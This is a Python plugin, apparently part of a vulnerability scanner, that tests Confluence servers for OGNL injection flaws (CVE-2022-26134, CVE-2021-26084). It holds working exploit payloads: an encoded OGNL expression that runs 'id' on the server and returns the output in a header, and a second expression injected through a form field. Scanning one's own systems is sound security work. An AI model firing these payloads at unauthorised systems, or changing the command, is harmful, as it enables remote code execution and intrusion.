from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("confluence_rce")


@register_scanner
class ConfluenceRCEScanner(BaseScanner):
    name = "Confluence OGNL RCE (CVE-2022-26134)"
    description = "Atlassian Confluence Server OGNL注入远程代码执行"
    category = "confluence"
    module = "confluence_rce"
    risk_level = "critical"
    risk_score = 10
    cve_ids = ["CVE-2022-26134", "CVE-2021-26084", "CVE-2022-26138"]
    references = [
        "https://jira.atlassian.com/browse/CONFSERVER-79016",
        "https://nvd.nist.gov/vuln/detail/CVE-2022-26134",
    ]
    fix_suggestion = "升级Confluence至最新版本，限制外网访问"

    DETECT_PATHS = [
        "/",
        "/login.action",
        "/dashboard.action",
        "/rest/api/user/anonymous",
        "/pages/viewpage.action",
    ]

    EXPLOIT_PAYLOADS = [
        {
            "name": "CVE-2022-26134 OGNL注入RCE",
            "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
            "method": "GET",
            "check_header": "X-Cmd-Response",
            "marker": "uid=",
        },
        {
            "name": "CVE-2021-26084 Confluence OGNL注入",
            "path": "/pages/createpage-entervariables.action?SpaceKey=x",
            "method": "POST",
            "data": "queryString=\\u0027+\\u007b\\u0031\\u002b\\u0031\\u007d\\u002b\\u0027",
            "marker": "2",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        },
    ]

    def _detect_confluence(self) -> bool:
        for path in ["/", "/login.action", "/dashboard.action"]:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue
            if "confluence" in resp.text.lower() or "Atlassian" in resp.text:
                return True
            if "ajs-version-number" in resp.text or "ajs-context-path" in resp.text:
                return True
        return False

    def check(self) -> bool:
        is_confluence = self._detect_confluence()
        if not is_confluence:
            return False

        self.add_result(
            name="Confluence Server 检测",
            risk_level="info",
            risk_score=0,
            target_url=self.target,
            detail="检测到Atlassian Confluence Server",
            evidence="响应中包含Confluence特征标识",
        )

        found = False
        for payload in self.EXPLOIT_PAYLOADS:
            url = f"{self.target}{payload['path']}"
            headers = payload.get("headers", {})
            data = payload.get("data")

            resp = http_request(payload["method"], url, data=data, headers=headers, allow_redirects=False)
            if resp is None:
                continue

            is_vuln = False
            evidence_parts = []

            check_header = payload.get("check_header", "")
            if check_header and check_header in resp.headers:
                cmd_output = resp.headers[check_header]
                if payload.get("marker", "") in cmd_output:
                    is_vuln = True
                    evidence_parts.append(f"Header {check_header}={cmd_output}")

            if resp.status_code == 302 and payload.get("marker", "") in resp.text:
                is_vuln = True
                evidence_parts.append("302响应中包含命令执行结果")

            marker = payload.get("marker", "")
            if marker and marker in resp.text and resp.status_code == 200:
                is_vuln = True
                evidence_parts.append(f"响应包含特征: {marker}")

            if is_vuln:
                self.add_result(
                    name=payload["name"],
                    risk_level="critical",
                    risk_score=10,
                    target_url=url,
                    detail=f"确认漏洞: {payload['name']}",
                    payload=data or payload["path"],
                    response_snippet=resp.text[:500],
                    evidence=" | ".join(evidence_parts),
                )
                found = True

        return found
